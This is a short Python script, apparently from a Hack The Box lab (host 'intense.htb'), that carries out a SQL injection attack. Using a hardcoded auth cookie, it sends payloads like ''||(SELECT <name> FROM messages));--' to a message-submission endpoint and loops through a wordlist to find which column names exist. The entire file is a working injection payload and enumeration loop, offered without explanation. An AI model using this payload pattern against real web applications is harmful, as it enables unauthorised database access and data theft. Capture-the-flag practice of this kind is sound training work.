import requests

cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.4uF40RAA+EnwwNCMtQnkEHP/KCjuoVoqqwoPT9mxGvE="
url = "http://intense.htb/submitmessage"
cookies = dict(auth=cookie)
#target = "common-tables.txt"
target = "common-columns.txt"
front = "'||(SELECT "
end = " FROM messages));--"


f = open("/home/kali/wordlists/"+target, "r")
for x in f:
    temp = x.strip()
    payload = {'message': front + temp + end}
    response = requests.post(url, data=payload,cookies=cookies)
    ret = (response.text)
    if ret == "OK":
        print(temp)

f.close()
